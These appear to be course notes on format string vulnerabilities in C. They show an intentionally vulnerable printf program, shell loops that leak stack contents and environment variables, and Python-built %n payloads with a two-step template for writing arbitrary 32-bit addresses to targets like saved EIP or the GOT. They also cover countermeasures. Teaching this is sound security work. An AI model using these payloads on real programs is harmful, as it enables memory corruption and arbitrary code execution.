**Format String**: Solution to the problem of having an output string including variables formatted according to the programmer. It is not the stuff we want to put on screen but are instructions on how to put stuff on screen. 
printf takes the input and print whatever parameter that doesn't have this format.
**Format String and Placeholders**
Specify how data is formatted into a string. Available in practically any programming
language's printing functions (e.g., printf).
**Variable Placeholders**
Placeholders identify the formatting type:
- %d or %i     decimal
- %u              unsigned decimal
- %o              unsigned octal
- %X or %x    unsigned hex
- %c              char
- %s              string (char*), prints chars until \0

```C
#include <stdio.h>
int main (int argc, char* argv[]) {
printf(argv[1]);
return 0;
}
```

```bash
$ gcc -o vuln vuln.c
$ ./vuln “hello”
hello
$ ./vuln "%x %x"
b7ff0590 804849b   #Whoops! What's going on? :-)
```
The program is printing out the stack. You can print Canaries, EBP, EIP values/addresses. 
Can be resolved not printing from main but from a function with a buffer.

Going back in the stack, we (usually) find part of our format string (e.g., AAAA, BBBB). Makes sense: the format string itself is often on the stack. **So, we can read what we put on the stack!**
#### Scanning the Stack With %N$x
To scan the stack we can use the %N$x syntax (go to the Nth parameter)

```bash
$ ./vuln "%x %x %x"
b7ff0590 804849b b7fd5ff4    # suppose that I want to print the 3rd

$ ./vuln "%3\$x"             # N$x is the direct parameter access
b7fd5ff4                     # (the \ escapes the $ symbol for bash)
```

This is done to jump into long series of bytes, automize the scanner through shell scripting
```bash
$ ./vuln "%x %x %x"        # suppose that I want to print the 3rd
b7ff0590 804849b b7fd5ff4  
$ ./vuln "%3\$x"           # N$x is the direct parameter access
b7fd5ff4                   # (the \ is to escape the $ symbol)


$ for i in `seq 1 150`; do echo -n "$i " && ./vuln "AAAA %$i\$x"; done
1 AAAA b7ff0590
2 AAAA 804849b
# ........lots of lines......   # 1 dword from the stack per line
150 AAAA 53555f6e               
$ for i in `seq 1 150`; do echo -n "$i " \
&& ./vuln "AAAB%$i\$x"; echo ""; done | grep 4141
114 AAAB42414141               # there is my cell I can read from!
                               # We had to go 114 positions up.
$ ./vuln "AAAB%114\$x"
AAAB42414141                   # So, we can effectively read.
 
```

What shouldn't happens is that printf write in memory. .
Scan the stack → Information leakage vulnerability
We can use the same technique to search for interesting data in memory
Information leakage vulnerability
```bash
$ for i in `seq 1 150`; do echo -n "$i " \
&& ./vuln "AAAA %$i\$s"; echo ""; done | grep HOME
64 AAAA HOME=/root
$ ./vuln "AAAA %64\$x"
AAAA 8048490            # here is its address
```

**A useful placeholder: %n**
%n = write, in the address pointed to by the argument, the number of chars (bytes) printed so far
E.g. 
int i = 0;
printf("hello%n",&i);
At this point, i == 5
Oops now printf writes on stack. 
**Writing to the Stack with %n**
%n = write, in the address pointed to by the argument, (treated as a pointer to int)
the number of chars printed so far.
```bash
$ ./vuln3 "AAAA %x %x %x"
buffer: AAAA b7ff0ae0 41414141 804849b
./vuln3 "AAAA %x %n %x"
Segmentation fault # bingo! Something unexpected happened... 
```
%n loads an int* (address) from the stack, goes there and writes the number of chars printed so far. In this case, that address is 0x41414141. Now I can crash the problem or I can use the fact that %n writes on stack and I can control %n as it is part of the format.
### **How can we use this?**
1. Put, on the stack, the address (addr) of the memory cell (target) to modify
2. Use %x to go find it on the stack (%N$x).
3. Use %n instead of that %x to write a number in the cell pointed to by addr, i.e. target.
Q: how can we practically write an address,
e.g. 0xbffff6cc instead of the useless 0x41414141? We cannot type those characters as easily as AAAA...
#### Using Python as a tool
We use Python to emit non printable chars, e.g. the four chars composing 0xbffff6cc
```bash
./vuln3 "AAAA%2$n"
./vuln3 "`python -c 'print "AAAA%2$n"'`"
./vuln3 "`python -c 'print "\x41\x41\x41\x41%2$n"'`"
./vuln3 "`python -c 'print "\xcc\xf6\xff\xbf%2$n"'`"
```

### How can we use this? (2)
1. Put, on the stack, the address (addr) of the memory cell (target) to modify
2. Use %x to go find it on the stack (%N$x).
3. Use %n instead of that %x to write a number
in the cell pointed to by addr, i.e. target.
Number == # bytes printed so far
Q: how do we change this into an arbitrary number that we control?
#### Controlling the Arbitrary Number
We use %c
```bash
void main () {
printf("|%050c|\n", 0x44);
printf("|%030c|\n", 0x44);
printf("|%013c|\n", 0x44);
}
$ ./padding
|0000000000000000000000000000000000000000000000000D| ~> 50
|00000000000000000000000000000D|                     ~> 30
|000000000000D|                                      ~> 13
```

We can also use precision character. 
The %c let you write concise code to print multiple character. 

```bash
# let's assume that we know the target address: 0xbffff6cc
$ ./vuln3 "`python -c 'print "\xcc\xf6\xff\xbf%50000c%2$n"'`"
```

Q: what is the value we are writing?
i.e. how many characters have been printed when we reach %n?
**A: 4+50000=50004**
The idea is to have my building string as the target address, build in the character and then %n. So we print out the gibber of the multiple character and the 4 bytes that we want to print.
The 4 bytes are written in reverse as we are using little endian. 
### Writing, step by step
Target address = 0xbffff6cc (Where to write)
Arbitrary number = 0x6028 (What to write)
1. Put, on the stack, the target address of the memory cell to modify (as part of the format string)
2. Use %x to go find it on the stack (%N$x) -> let’s call the displacement pos
3. Use %c and %n to write 0x6028 in the cell pointed to by target (remember: parameter of %c +len(printed))

Problem: We want to write a valid 32 bit address (e.g., of a valid memory location or function) as the Arbitrary number (What to write)
0xbfffffff (hex)  == 3,221,225,471 (dec)
Q: How can we write such a “big” number ?
**Writing 32 bit Addresses (16 + 16 bit)**
In other to avoid writing GB of data. We split each DWORD (32 bits, up to 4GB) into 2
WORDs (16 bits, up to 64KB), and write them in two rounds.
**Remember**: once we start counting up with %c, **we cannot count down**(we could overflow). We can only keep going up. So, we need to do some math.
- 1st round: word with lower absolute value.
- 2nd round: word with higher absolute value
We need to perform the writing procedure twice in the same format string
We need:
- The target addresses of the two writes (which will be at 2 bytes of distance)
- The displacements of the two targets
- Do some math to compute the arbitrary numbers to write (i.e., the ones that added together yield the 32 bits address)
```
<target><target+2>%<lower_value>c%pos$n<higher_value>c%pos+1$n
```

1. Put, on the stack, the 2 target addresses of the memory cells to modify (as part of the format string)
2. Use %x to go find <target_1> on the stack (%N$x) -> let’s call the displacement pos
	a. <target_2> will be at pos+1 (i.e., it’s located one DWORD up)
	![](https://i.imgur.com/p3TtXid.png)
3. Use %c and %n to write
	a. the lower absolute value in the cell pointed to by <target_1>
	b. The higher decimal value in the cell pointed by <target_2>
## A Word on the TARGET address
The saved return address (saved EIP)
- Like a “basic” stack overflow
	 You must find the address on the stack :)
- The Global Offset Table (GOT)
	 dynamic relocations for functions
- C library hooks
- Exception handlers
- Other structures, function pointers
Threat is both on code and data.
One thing to prevent this is to use printf("%s", s); and not printf(s); or simply use puts(s);(The compiler already use this).
### A Word on Countermeasures
- memory error countermeasures seen in the previous slides help to prevent exploitation
- modern compilers will show warnings when potentially dangerous calls to printf-like functions are found
- patched versions of the libc to mitigate the problem
	- e.g., count the number of expected arguments and check that they match the number of placeholders
	- FormatGuard:http://www.cs.columbia.edu/~gskc/security/formatguard.pdf
	- Compiler integration of count-and-check approach: [Venerable Variadic Vulnerabilities Vanquished](https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/biswas)(the overhead is 0.44%)
### Essence of the Problem
Conceptually, format string bugs are not specific to printing functions. In theory, any
function with a unique combination of characteristics is potentially affected:
- a so-called variadic function
	a variable number of parameters,
	the fact that parameters are "resolved" at runtime by pulling them from the stack,
- a mechanism (e.g., placeholders) to (in)directly r/w arbitrary locations,
- the ability for the user to control them
The problem is that you are programming printf as it has write, reads, can count and have loops(printf format string is Turing Complete, %n let print be Turing complete).
C-like format strings interpreters (printf, sprintf,...) are acting according to a user-specified string which can express:
- Counters (the printed chars one)
- Conditional writes in arbitrary locations
- Read operations and arithmetics
Enough to implement conditional jumps and loops... the printf behavior is Turing complete! (see https://nebelwelt.net/publications/files/15SEC.pdf,
https://github.com/HexHive/printbf for an example)
# Conclusions
- Format strings are another type of memory error vulnerability.
- More math is required to write an exploit, but the consequences are the same: arbitrary code execution.
- Where to jump, is up to the attacker, as usual, but may depends on many conditions.
- Exercise: try to write a little calculator to automate the exploit generation given the target, displacement and value ;-)
